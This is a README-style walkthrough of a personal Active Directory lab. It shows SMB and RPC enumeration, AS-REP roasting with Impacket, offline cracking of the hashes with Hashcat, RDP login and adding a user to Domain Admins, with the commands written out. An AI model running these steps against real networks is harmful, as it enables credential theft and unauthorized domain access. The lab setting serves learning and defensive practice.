

# Active Directory Lab: Enumeration & Privilege Escalation (Educational)

This repository contains a walkthrough of an **Active Directory (AD) lab environment** used for learning **internal enumeration, password attacks, and privilege escalation**. All activities are performed in a controlled lab setup for **educational purposes only**.

## ⚠️ Disclaimer

This lab is for **educational purposes only**. Do **not** attempt these techniques on unauthorized networks or systems. Always get explicit permission before performing penetration testing.

---

## 🛠 Lab Environment

* **Domain Controller:** Windows Server 2022
* **Domain:** `emmanuel.local`
* **Users:** `emmanuel`, `jane`, `bob`
* **Kali Linux VM:** Used for enumeration, SMB access, and password attacks
* **Tools Used:**

  * `smbclient` (SMB file access)
  * `rpcclient` (AD enumeration)
  * `Impacket` (GetNPUsers, AS-REP roasting)
  * `Hashcat` (password cracking)
  * `xfreerdp` (RDP connection)
  * PowerShell AD cmdlets

---

## 📝 Lab Walkthrough

### 1️⃣ Enumerating SMB Shares

```bash
smbclient -L //192.168.10.6 -U 'emmanuel.local/emmanuel'
```

* Enumerated shares: `SYSVOL`, `NETLOGON`, `ADMIN$`, `C$`.
* Successfully accessed `SYSVOL` and `NETLOGON` using `emmanuel` credentials.

---

### 2️⃣ Accessing Policies & Scripts

* Navigated the `SYSVOL` share to review Group Policy objects and scripts.
* Downloaded files for analysis in `~/loot/SYSVOL`.

---

### 3️⃣ Enumerating AD Users

```bash
rpcclient -U "emmanuel%password" 192.168.10.6
enumdomusers
```

* Users discovered: `Administrator`, `emmanuel`, `jane`, `bob`.

---

### 4️⃣ AS-REP Roasting (No Pre-Auth)

```bash
impacket-GetNPUsers emmanuel.local -dc-ip 192.168.10.6 -request
```

* Retrieved AS-REP hashes for users with **no pre-authentication required** (`emmanuel`, `jane`, `bob`).

---

### 5️⃣ Cracking Hashes

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O --username --outfile cracked.txt
```

* Successfully cracked passwords for `emmanuel` and `jane`.
* Bob’s hash could not be cracked (used a strong password).

---

### 6️⃣ RDP Access

* Found RDP open on the DC: `3389/tcp`.
* Connected using **Jane**, who already had administrative privileges, to access the server.

---

### 7️⃣ Privilege Escalation

* Verified **Domain Admin group** membership:

```powershell
Get-ADGroupMember "Domain Admins"
```

* Elevated `emmanuel` to **Domain Admins** using PowerShell cmdlets.

---

## 📂 Directory Structure (Loot Example)

```
~/loot/
├─ SYSVOL/
│  ├─ Policies/
│  │  ├─ {GUID}/
│  │  └─ ...
│  └─ scripts/
└─ NETLOGON/
```

---

## 💡 Key Takeaways

* Enumerating SMB shares and AD objects is crucial for **internal reconnaissance**.
* AS-REP roasting is effective against accounts with **no pre-authentication**.
* Privilege escalation can be practiced safely in **controlled lab environments**.

---

## ⚡ Tools & References

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [Hashcat](https://hashcat.net/hashcat/)
* [PowerShell Active Directory Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/)
* [FreeRDP](https://www.freerdp.com/)


